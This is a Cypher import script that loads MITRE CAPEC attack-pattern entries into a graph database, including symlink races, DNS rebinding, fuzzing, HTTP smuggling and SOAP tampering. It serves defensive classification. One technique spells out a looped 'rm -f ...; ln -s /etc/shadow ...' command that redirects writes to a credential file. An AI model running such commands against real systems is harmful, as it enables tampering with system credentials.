MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 206});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 246, summary: "OrderedDict([('Text', 'The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.')])"});
CREATE (:ResourcesRequired{id: 144, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must understand how the logging mechanism works.</p>\n  <p class=\"text\">Optionally, the attacker must know the location and the format of individual entries of the log files.</p>\n</div>"});
CREATE (:AttackPattern{id: 269, name: "DEPRECATED: Registry Manipulation", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:Submission{id: 250});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 207});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description, Description Summary, Related_Attack_Patterns"});
CREATE (:Description{id: 247, summary: "OrderedDict([('Text', 'This pattern has been deprecated as it was determined to be a duplicate of another pattern. Please refer to the pattern CAPEC-203 : Manipulate Application Registry Values going forward.')])"});
CREATE (:AttackPattern{id: 27, name: "Leveraging Race Conditions via Symbolic Links", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 226, text: "<div level=\"0\">\n  <p class=\"text\">The attacker is able to create Symlink links on the target host.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 227, text: "<div level=\"0\">\n  <p class=\"text\">Tainted data from the attacker is used and copied to temporary files.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 228, text: "<div level=\"0\">\n  <p class=\"text\">The target host does insecure temporary file creation.</p>\n</div>"});
CREATE (:Submission{id: 251});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 208});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 248, summary: "OrderedDict([('Text', \"This attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files. An attacker can create a Symlink link to a target file not otherwise accessible to her. When the privileged program tries to create a temporary file with the same name as the Symlink link, it will actually write to the target file pointed to by the attackers' Symlink link. If the attacker can insert malicious content in the temporary file she will be writing to the sensitive file by using the Symlink. The race occurs because the system checks if the temporary file exists, then creates the file. The attacker would typically create the Symlink during the interval between the check and the creation of the temporary file.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Verify that target host's platform supports symbolic links.", description: "<div level=\"0\">\n  <p class=\"text\">This attack pattern is only applicable on platforms that support symbolic links.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Research target platform to determine whether it supports symbolic links.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Create a symbolic link and ensure that it works as expected on the given platform.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Target platform supports symbolic links (e.g. Linux, UNIX, etc.)"});
CREATE (:Outcome{id: 2, type: "Failure", description: "Target platform does not support symbolic links (e.g. MS Windows)"});
CREATE (:AttackStep{id: 2, title: "Examine application's file I/O behavior", description: "<div level=\"0\">\n  <p class=\"text\">Analyze the application's file I/O behavior to determine where it stores files, as well as the operations it performs to read/write files.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use kernel tracing utility such as ktrace to monitor application behavior</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use debugging utility such as File Monitor to monitor the application's filesystem I/O calls</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Watch temporary directories to see when temporary files are created, modified and deleted.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Analyze source code for open-source systems like Linux, Apache, etc.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker can watch files being created, modified and/or deleted by application.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Application does not seem to perform any filesystem I/O operations.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker identifies at least one reproducible file I/O operation performed by the application."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker cannot identify any file I/O operations being performed by the application."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Verify ability to write to filesystem", description: "<div level=\"0\">\n  <p class=\"text\">The attacker verifies ability to write to the target host's file system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Create a file that does not exist in the target directory (e.g. \"touch temp.txt\" in UNIX-like systems)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">On platforms that differentiate between file creation and file modification, if the target file that the application writes to already exists, attempt to modify it.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Verify permissions on target directory</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Target directory is a globally writable temp directory (e.g. /tmp in many UNIX-like systems)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Target directory is writable by the attackers' effective user ID.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker can create and modify files in the target directory."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker cannot create or modify files in the target directory."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Replace file with a symlink to a sensitive system file.", description: "<div level=\"0\">\n  <p class=\"text\">Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file, the attacker replaces the file with a symlink to a sensitive system file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Create an infinite loop containing commands such as \"rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat\". Wait for an instance where the following steps occur in the given order: (1) Application ensures that tempfile.dat exists and that the user has access to it, (2) \"rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat\", and (3) Application opens tempfile.dat for writing, and inadvertently opens /etc/shadow for writing instead.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use other techniques with debugging tools to replace the file between the time the application checks the file and the time the application opens it.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Sensitive file tampered with successfully."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Sensitive file could not be tampered with."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Corrective"});
MERGE (:Reference{id: "REF-6", local_id: "R.27.1", title: "Wikipedia", section: "Symlink race", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Symlink_race"});
MERGE (:Reference{local_id: "R.27.2", title: "mkstemp", link: "http://www.opengroup.org/onlinepubs/009695399/functions/mkstemp.html"});
MERGE (:CWE{id: 367});
MERGE (:CWE{id: 61});
MERGE (:CWE{id: 662});
MERGE (:CWE{id: 689});
MERGE (:CWE{id: 667});
CREATE (:AttackPattern{id: 270, name: "Modification of Registry Run Keys", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 252});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 209});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 249, summary: "OrderedDict([('Text', 'An adversary adds a new entry to run keys in the registry in an attempt to automatically execute a desired application.')])"});
MERGE (:Reference{local_id: "R.270.1", author: "ATT&CK Project", title: "Registry Run Keys – Start Folder (1060)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Registry_run_keys_/_start_folder"});
CREATE (:AttackPattern{id: 271, name: "Schema Poisoning", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 253});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 210});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description, Description Summary, Related_Attack_Patterns"});
CREATE (:Description{id: 250, summary: "OrderedDict([('Text', 'An attacker corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the attacker can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.')])"});
CREATE (:AttackPattern{id: 272, name: "Protocol Manipulation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 229, text: "<div level=\"0\">\n  <p class=\"text\">The protocol or implementations thereof must contain bugs that an adversary can exploit.</p>\n</div>"});
CREATE (:Submission{id: 254});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 251, summary: "OrderedDict([('Text', 'An adversary subverts a communications protocol to perform an attack. This type of attack can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.')])"});
CREATE (:ResourcesRequired{id: 146, text: "<div level=\"0\">\n  <p class=\"text\">In some variants of this attack the adversary must be able to intercept communications using the protocol. This means they need to be able to receive the communications from one participant and prevent the other participant from receiving these communications.</p>\n</div>"});
CREATE (:AttackPattern{id: 273, name: "HTTP Response Smuggling", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 230, text: "<div level=\"0\">\n  <p class=\"text\">The targeted server must allow the attacker to insert content that will appear in the server's response.</p>\n</div>"});
CREATE (:Submission{id: 255});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 252, summary: "OrderedDict([('Text', 'An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions.')])"});
MERGE (:Reference{local_id: "R.273.1", title: "HTTP Response Smuggling", publisher: "Beyond Security", link: "http://www.securiteam.com/securityreviews/5CP0L0AHPC.html"});
MERGE (:Reference{id: "REF-1", local_id: "R.273.2", title: "WASC Threat Classification 2.0", section: "WASC-27 - HTTP Response Smuggling", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/HTTP-Response-Smuggling"});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 436});
CREATE (:ResourcesRequired{id: 147, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are needed for this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 274, name: "HTTP Verb Tampering", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 231, text: "<div level=\"0\">\n  <p class=\"text\">The targeted system must attempt to filter access based on the HTTP verb used in requests.</p>\n</div>"});
CREATE (:Submission{id: 256});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 253, summary: "OrderedDict([('Text', 'An attacker modifies the HTTP Verb (e.g. GET, PUT, TRACE, etc.) in order to bypass access restrictions. Some web environments allow administrators to restrict access based on the HTTP Verb used with requests. However, attackers can often provide a different HTTP Verb, or even provide a random string as a verb in order to bypass these protections. This allows the attacker to access data that should otherwise be protected.')])"});
MERGE (:Reference{local_id: "R.274.1", author: "Arshan Dabirsiaghi", title: "Bypassing Web Authentication and Authorization with HTTP Verb Tampering: How to inadvertently allow attackers full access to your web application", publisher: "Aspect Security", link: "http://mirror.transact.net.au/sourceforge/w/project/wa/waspap/waspap/Core/Bypassing_VBAAC_with_HTTP_Verb_Tampering.pdf"});
MERGE (:CWE{id: 302});
MERGE (:CWE{id: 654});
CREATE (:ResourcesRequired{id: 148, text: "<div level=\"0\">\n  <p class=\"text\">The attacker requires a tool that allows them to manually control the HTTP verb used to send messages to the targeted server.</p>\n</div>"});
CREATE (:AttackPattern{id: 275, name: "DNS Rebinding", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 232, text: "<div level=\"0\">\n  <p class=\"text\">The target browser must access content server from the attacker controlled DNS name. Web advertisements are often used for this purpose. The target browser must honor the TTL value returned by the attacker and re-resolve the attackers' DNS name after initial contact.</p>\n</div>"});
CREATE (:Submission{id: 257});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 211});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Weaknesses"});
CREATE (:Description{id: 254, summary: "OrderedDict([('Text', \"An attacker serves content whose IP address is resolved by a DNS server that it controls and after initial contact by a web browser or similar client it changes the IP address to which its name resolves to an address within the target browser's organization that is not publicly accessible, thus allowing the web browser to examine this internal address on its behalf. Web browsers enforce security zones based on DNS names in order to prevent cross-zone disclosure of information. In a DNS binding attack an attacker publishes content on their own server with their own name and DNS server. The first time the target accesses the attackers' content, the attackers' name must be resolved to an IP address. The attacker's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value. When the target makes a subsequent request to the attackers' content the attackers' DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source. Because the same name resolves to both these IP addresses, browsers will place both IP addresses in the same security zone and allow information to flow between the addresses. The attacker can then use scripts in the content the target retrieved from the attacker in the original message to exfiltrate data from the named internal addresses. This allows attackers to discover sensitive information about the internal network of an enterprise. If there is a trust relationship between the computer with the targeted browser and the internal machine the attacker identifies, additional attacks are possible. This attack differs from pharming attacks in that the attacker is the legitimate owner of the malicious DNS server and so does not need to compromise behavior of external DNS services.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Identify potential DNS rebinding targets", description: "<div level=\"0\">\n  <p class=\"text\">An attacker publishes content on their own server with their own name and DNS server. Attract HTTP traffic and explore rebinding vulnerabilities in browsers, flash players of old version.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker uses Web advertisements to attract the victim to access attacker's DNS. Explore the versions of web browser or flash players in HTTP request.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Old versions that have DNS rebinding vulnerabilities.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">New versions that have fixed DNS rebinding vulnerabilities.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of browser's information."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No browser's information in HTTP request."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Establish initial target access to attacker DNS", description: "<div level=\"0\">\n  <p class=\"text\">The first time the target accesses the attackers' content, the attackers' name must be resolved to an IP address. The attacker's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker finds some local active servers."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The attacker could not find any active local server."});
CREATE (:AttackStep{id: 2, title: "Rebind DNS resolution to target address", description: "<div level=\"0\">\n  <p class=\"text\">the target makes a subsequent request to the attackers' content the attackers' DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker rebinds victim's internal IP address of these servers with his server name."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker fails to rebind victim's internal IP address of these servers with his server name."});
CREATE (:AttackStep{id: 3, title: "Determine exploitability of DNS rebinding access to target address", description: "<div level=\"0\">\n  <p class=\"text\">The attacker can then use scripts in the content the target retrieved from the attacker in the original message to exfiltrate data from the named internal addresses.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's script is executed in victim's browser."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Malicious script is not executed in victim's browser, no HTTP request from the script."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Access & exfiltrate data within the victim's security zone", description: "<div level=\"0\">\n  <p class=\"text\">The attacker can then use scripts in the content the target retrieved from the attacker in the original message to exfiltrate data from the internal addresses. This allows attackers to discover sensitive information about the internal network of an enterprise.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker attempts to use victim's browser as an HTTP proxy to other resources inside the target's security zone. This allows two IP addresses placed in the same security zone.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Attacker tries to scan and access all internal hosts in victim's local network by sending multiple short-lived IP addresses.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Two IP addresses placed in the same security zone communicating each other."});
CREATE (:Outcome{id: 2, type: "Success", description: "Attacker can scan and access all internal hosts in victim's local network by sending multiple short-lived IP addresses."});
CREATE (:Outcome{id: 3, type: "Failure", description: "Attacker fails to access internal server's information."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{local_id: "R.275.1", author: "['Collin Jackson', 'Adam Barth', 'Andrew Bortz', 'Weidong Shao', 'Dan Boneh']", title: "Protecting Browsers from DNS Rebinding Attacks"});
MERGE (:Reference{id: "REF-6", local_id: "R.275.2", title: "Wikipedia", section: "DNS rebinding", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/DNS_rebinding"});
MERGE (:CWE{id: 350});
CREATE (:ResourcesRequired{id: 149, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must serve some web content that a victim accesses initially. This content must include executable content that queries the attackers' DNS name (to provide the second DNS resolution) and then performs the follow-on attack against the internal system. The attacker also requires a customized DNS server that serves an IP address for their registered DNS name, but which resolves subsequent requests by a single client to addresses internal to that client's network.</p>\n</div>"});
CREATE (:AttackPattern{id: 276, name: "Inter-component Protocol Manipulation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 258});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:AttackPattern{id: 277, name: "Data Interchange Protocol Manipulation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 259});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:AttackPattern{id: 278, name: "Web Services Protocol Manipulation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:AttackPrerequisite{id: 233, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application or service must rely on web service protocols in such a way that malicious manipulation of them can subvert functionality.</p>\n</div>"});
CREATE (:Submission{id: 260});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 255, summary: "OrderedDict([('Text', 'An attacker manipulates functions and/or their values used by web-related protocols to cause a web application or service to react differently that intended, allowing the attacker to gain access to data or resources normally restricted or to cause the application or service to crash. This can either be performed through the manipulation of call parameters with unexpected values or by calling functions that should normally be restricted or limited.')])"});
CREATE (:ResourcesRequired{id: 150, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to manipulate the targeted application or service.</p>\n</div>"});
CREATE (:AttackPattern{id: 279, name: "Soap Manipulation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 261});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:AttackPattern{id: 28, name: "Fuzzing", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:Submission{id: 262});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 212});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:Description{id: 256, summary: "OrderedDict([('Text', 'In this attack pattern, the adversary leverages fuzzing to try to identify weaknesses in the system. Fuzzing is a software security and functionality testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occurred. Fuzzing treats the system as a black box and is totally free from any preconceptions or assumptions about the system. Fuzzing can help an attacker discover certain assumptions made about user input in the system. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions despite not necessarily knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve his goals.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Observe communication and inputs", description: "<div level=\"0\">\n  <p class=\"text\">The fuzzing attacker observes the target system looking for inputs and communications between modules, subsystems, or systems.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Network sniffing. Using a network sniffer such as wireshark, the attacker observes communications into and out of the target system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the attacker observes the system calls and API calls that are made by the target system, and the nature of their parameters.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker creates a list of unique communications packets, messages, inputs, API calls or other actions the software takes."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Generate fuzzed inputs", description: "<div level=\"0\">\n  <p class=\"text\">Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Observe the outcome", description: "<div level=\"0\">\n  <p class=\"text\">Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs, determine why that happened. Figure out the underlying assumption that was invalidated by the input.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The software produces an indicator that the attacker can see (error message, altered error state in a protocol, etc.).</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The previous step led to plausible, practical fuzz inputs.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "If the software's indicators (error messages, etc.) vary clearly based on the attackers' input, then the attacker has a sufficient starting point for customizing his attack."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The attacker is unable to induce unexpected failures or output based fuzzed inputs."});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Craft exploit payloads", description: "<div level=\"0\">\n  <p class=\"text\">Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Identify and embed shell code for the target system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Embed higher level attack commands in the payload. (e.g., SQL, PHP, server-side includes, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Induce denial of service by exploiting resource leaks or bad error handling.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 388});
MERGE (:CWE{id: 20});
CREATE (:ResourcesRequired{id: 151, text: "<div level=\"0\">\n  <p class=\"text\">Fuzzing tools.</p>\n</div>"});
CREATE (:AttackPattern{id: 280, name: "SOAP Parameter Tampering", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 234, text: "<div level=\"0\">\n  <p class=\"text\">The targeted server either fails to verify that data in SOAP messages conforms to the appropriate XML schema, or it fails to correctly handle the complete range of data allowed by the schema.</p>\n</div>"});
CREATE (:Submission{id: 263});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 257, summary: "OrderedDict([('Text', 'An attacker sends a SOAP message where the field values are other than what the server is likely to expect in order to precipitate non-standard server behavior. In a SOAP message, parameters take the form of values within XML elements. The server will have an XML schema that indicates certain restrictions on these parameter values. For example, the server may expect a parameter to be a string with fewer than 10 characters, or a number less than 100. In a SOAP parameter tampering attack, an attacker either violates this schema, or takes advantage of flexibility within the scheme (for example, a lack of a character limit) to provide parameters that a server might not expect. Examples of unexpected parameters include oversized data, data with different data types, inserting metacharacters within data, and sending contextually inappropriate data (for example, sending a non-existent product name in a product name field or using an out-of-order sequence number). Results of this attack can include information disclosure, denial of service, or even execution of arbitrary code.')])"});
MERGE (:Reference{local_id: "R.280.1", author: "['Navya Sidharth', 'Jigang Liu']", title: "Resistant SOAP Messaging with IAPF"});
MERGE (:Reference{local_id: "R.280.2", author: "Shreeraj Shah", title: "Web 2.0 Security: Defending Ajax, RIA, and SOA", section: "Chapter 12. SOA Attack Vectors and Scanning for Vulnerabilities: Parameter Tampering", publisher: "Course Technology PTR", pubdate: "December 04, 2007", link: "http://my.safaribooksonline.com/9781584505501/ch12lev1sec4"});
CREATE (:ResourcesRequired{id: 152, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to craft arbitrary SOAP messages and send them to the targeted server.</p>\n</div>"});
CREATE (:AttackPattern{id: 285, name: "ICMP Echo Request Ping", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 235, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send an ICMP type 8 query (Echo Request) to a remote target and receive an ICMP type 0 message (ICMP Echo Reply) in response. Any firewalls or access control lists between the sender and receiver must allow ICMP Type 8 and ICMP Type 0 messages in order for a ping operation to succeed.</p>\n</div>"});
CREATE (:Submission{id: 264});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
